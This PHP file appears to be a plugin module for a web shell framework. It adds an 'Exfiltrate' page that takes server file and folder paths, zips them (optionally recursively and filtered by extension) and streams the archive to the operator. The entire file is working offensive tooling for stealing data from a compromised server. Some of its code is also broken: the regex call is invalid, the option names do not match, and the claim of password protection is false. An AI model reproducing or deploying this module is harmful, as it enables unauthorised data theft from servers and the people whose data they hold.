<?php

// section.constants
$EXFILTRATE = "__FEAT_EXFILTRATE__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeExfiltratePage(&$page_content, array $features, $page, $css): void {
    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        [
            __PREFIX__makePageHeader(
                $features[$page]["title"],
                $features[$page]["description"]
            ),
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                [
                    __PREFIX__makeInput(
                        "textarea",
                        "Paths",
                        "__PARAM_1__",
                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                        "List of file/folders to include in the zip archive.<br/>" .
                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",with_tree") .
                        " to include all files and folders within a given directory.<br/>" .
                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",extensions=txt|doc|xlsx") .
                        " to include only files with the given extensions.",
                        true
                    ),
                ]
            ),
            // if a request with the status parameter is received create the command output screen and render the status
            empty($_GET["status"])
                ? ""
                : __PREFIX__openCommandOutputScreen(true) .
                  htmlentities($_GET["status"]) .
                  __PREFIX__closeCommandOutputScreen(true),
        ]
    );
}

/**
 * Get the shortest common path from a list of paths
 *
 * @param $paths string[] List of paths
 */
function __PREFIX__getShortestCommonPath($paths): ?string {
    if (empty($paths)) {
        return null;
    }

    // Initialize with first path
    $shortest_path = $paths[0];

    foreach ($paths as $path) {
        $common_path       = '';
        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));

        $min_length = min(count($path_segments), count($shortest_segments));
        for ($i = 0; $i < $min_length; $i++) {
            if ($path_segments[$i] === $shortest_segments[$i]) {
                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        // Update shortest path if shorter common path found
        $shortest_path = $common_path;
    }

    // Remove trailing separator if present
    return rtrim($shortest_path, DIRECTORY_SEPARATOR);
}

/**
 * Add a directory to a zip archive
 *
 * @param $dir string Directory to add
 * @param $zip ZipArchive Zip archive to add to
 * @param $recursive bool Whether to add the directory recursively
 * @param $extensions string[] Extensions to include
 * @param $cleanup_path string Path to cleanup
 */
function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = ""): void {
    $dir_handle = opendir($dir);

    while (($file = readdir($dir_handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
            $sub_path = "$dir/$file";

            if (
                is_file($sub_path) &&
                ($extensions === [] || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
            ) {
                // Add with relative path within zip
                $zip->addFile(
                    $sub_path,
                    str_replace(
                        $cleanup_path,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($sub_path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            else {
                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                    __PREFIX__addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                }
            }
        }
    }

    closedir($dir_handle);
}

/**
 * Handle the zip creation process
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 */
function __PREFIX__handleExfiltrate($operation, $features): void {
    $content = $_POST['__PARAM_1__'];

    // ensure the zip extension is loaded
    if (!extension_loaded('zip')) {
        // redirect to the same page with the error status
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Zip extension is not loaded.")
        );
        return;
    }

    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");

    // if the zip file cannot be opened fail
    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Could not create temporary archive.")
        );
        return;
    }

    $lines            = explode("\n", $content);
    $path_replacement = __PREFIX__getShortestCommonPath($lines);

    // loop through the lines to extract
    foreach ($lines as $line) {
        // Split line by comma to extract options
        $parts = explode(',', trim($line));
        $path  = !empty($parts[0]) ? $parts[0] : '';

        // check if want to exfiltrate recursively
        $recursive  = in_array('with_tree', $parts);
        $extensions = [];

        // load the whitelisted extensions
        foreach ($parts as $part) {
            if (str_starts_with($part, 'extension=')) {
                $extensions = explode("|", strtolower(trim(substr($part, 10)))); // 10 = "extension=".length
                break;
            }
        }

        if ($path) {
            if (
                is_file($path) && // got a file
                // with a whitelisted extension (or extensions are not defined)
                ($extensions === [] || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
            ) {
                // add the file to the zip archive
                $zip->addFile(
                    $path,
                    str_replace(
                        $path_replacement,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            elseif (is_dir($path) && is_readable($path)) {
                __PREFIX__addDirectoryToZip(
                    $path,
                    $zip,
                    $recursive,
                    $extensions,
                    $path_replacement . DIRECTORY_SEPARATOR
                );
            }
        }
    }

    $zip->close();

    $file_size = filesize($zip_name);
    __PREFIX__chunkedDownload($zip_name, $file_size, "export.zip");

    // Delete temporary zip file;
    unlink($zip_name);
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 */
function __PREFIX__exfiltrateHooksIsolatedOps(&$isolated_ops): void {
    global $EXFILTRATE;

    $isolated_ops[] = $EXFILTRATE;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 */
function __PREFIX__exfiltrateHooksFeatures(&$features): void {
    global $EXFILTRATE;

    $features[] = [
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
</svg>',
        "op"          => $EXFILTRATE,
    ];
}

// section.functions.end

// section.hooks
add_hook("isolated_ops", "__PREFIX__exfiltrateHooksIsolatedOps");
add_hook("features", "__PREFIX__exfiltrateHooksFeatures");
add_named_hook("GET_page", $EXFILTRATE, "__PREFIX__makeExfiltratePage");
add_named_hook("POST_operation", $EXFILTRATE, "__PREFIX__handleExfiltrate");
// section.hooks.end